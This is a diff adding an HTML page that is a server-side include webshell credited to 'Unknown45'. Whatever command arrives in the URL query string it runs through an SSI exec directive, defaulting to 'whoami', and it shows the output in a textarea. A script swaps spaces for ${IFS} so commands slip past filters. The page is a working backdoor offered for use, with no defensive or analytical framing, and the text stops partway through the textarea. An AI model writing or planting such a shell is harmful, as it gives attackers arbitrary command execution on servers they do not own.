@@ -1,0 +1,52 @@
+<!--#config errmsg="Error / Webnya Ga Support SSI Command"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="whoami" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+<head>
+<title>SSI Webshell</title>
+<meta name="theme-color" content="#000">
+<meta name="Author" content="Unknown45">
+<meta name="description" content="Security ? that just an illusion - ">
+<meta property="og:description" content="Security ? that just an illusion - ">
+</head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
+<script language="javascript">
+
+function unknown45()
+{
+	var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep)+"&&test";
+}
+
+
+</script>
+<style type="text/css">
+	.input {
+		background: transparent;
+		border-color: #ffffff;
+		border-width: thin;
+		border: groove;
+		cursor: pointer;
+	}
+
+	button {
+		cursor: pointer;
+	}
+</style>
+
+</head>
+<body onload="checkaja()">
+<font face=courier size=2><i><center>SSI Webshell by Unknown45<hr><font face="courier" size=2>
+<font size=2>Command : <input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;"> <button class="input" id="gas" onclick="unknown45();">Execute</button></center>
+<hr></i>
+Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl --></font></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15 style="width: 100%">
+<!--#exec cmd=$shl -->
